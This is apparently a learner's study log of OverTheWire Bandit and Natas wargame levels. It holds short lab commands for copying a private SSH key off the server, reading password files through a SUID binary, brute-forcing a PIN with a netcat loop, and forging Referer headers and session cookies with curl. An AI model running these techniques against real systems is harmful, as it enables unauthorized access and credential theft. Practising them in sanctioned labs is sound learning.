# Day 34 — Hacker Log

## 🐧 OverTheWire Bandit: Daily Grind (5 Levels)

### Drill 1: Level 7 → 8 (Grep)
- Command: `cat data.txt | grep "millionth"`
- Concept: Filtering millions of lines to find one keyword.

### Drill 2: Level 13 → 14 (SSH Key Authentication)
- Found `sshkey.private` on the server.
- Exfiltrated key to local Windows machine:
  `scp -P 2220 bandit13@bandit.labs.overthewire.org:sshkey.private D:\sshkey01.private`
- Fixed Windows permissions (SSH refuses unprotected keys):
  `icacls D:\sshkey01.private /inheritance:r`
  `icacls D:\sshkey01.private /grant:r "%USERNAME%":(R)`
- Authenticated with the key:
  `ssh -i D:\sshkey01.private -p 2220 bandit14@bandit.labs.overthewire.org`
- Concept: SSH key auth, private key file permissions.

### Drill 3: Level 19 → 20 (SUID Privilege Escalation)
- Command: `./bandit20-do cat /etc/bandit_pass/bandit20`
- Concept: SUID bit runs the binary as its OWNER. Golden Formula.

### Drill 4: Level 23 → 24 → 25 (Cron Exploit + Brute Force)
- Enumerated cron jobs: `ls -la /etc/cron.d/`
- Read the robot's brain: `cat /usr/bin/cronjob_bandit24.sh`
- Brute-forced 10,000 PINs through one netcat pipe:
  `for i in {0000..9999}; do echo "$PASS $i"; done | nc localhost 30002 | grep "Correct" -A 2`
- Concept: Cron exploitation, brute force automation, output filtering.

### Drill 5: Level 29 → 30 (Git Hidden Branches)
- Commands: `git clone`, `git branch -a`, checkout hidden remote branch
- Concept: Developers hide secrets in "dev" branches. Git remembers everything.

## 🕸️ OverTheWire Natas: Web Hacking (Levels 0 → 5)
- **0→1:** View Source → password hidden in HTML comment (Information Disclosure)
- **1→2:** Right-click blocked → bypassed with `CTRL+U` / `view-source:` (client-side restrictions are not security)
- **2→3:** `img src="files/pixel.png"` → browsed `/files/` → Directory Listing exposed `users.txt`
- **3→4:** `robots.txt` → `Disallow: /s3cr3t/` → found hidden directory
- **4→5:** Forged HTTP Referer header: `curl -e "http://natas5..." -u natas4:<REDACTED> http://natas4.../`
- **5→6:** Forged session cookie: `curl -b "loggedin=1" -u natas5:<REDACTED> http://natas5.../`

## 🐍 Python: First Web Exploit Tool (natas5.py)
- Built a script using the `requests` library to forge cookies and auth.
- Concepts: tuples `()` for auth, dictionaries `{}` for cookies, `requests.get()`, `response.text`
- Real-world lesson: Google Colab IPs are blocked by OverTheWire's firewall → exploits must run from local machines.

## 🧠 Concepts Locked In Today
- SSH key authentication & Windows `icacls` permissions
- SUID privilege escalation (Golden Formula)
- Cron job exploitation via `/var/spool/`
- Brute force loops with `for`, `nc`, and `grep`
- HTTP headers, cookies, and session forgery
- Information disclosure, directory listing, robots.txt
- Cloud IP blocking (how real firewalls defend)

## ⚠️ Security Note
No real passwords or private keys are stored in this repository. Placeholders only.
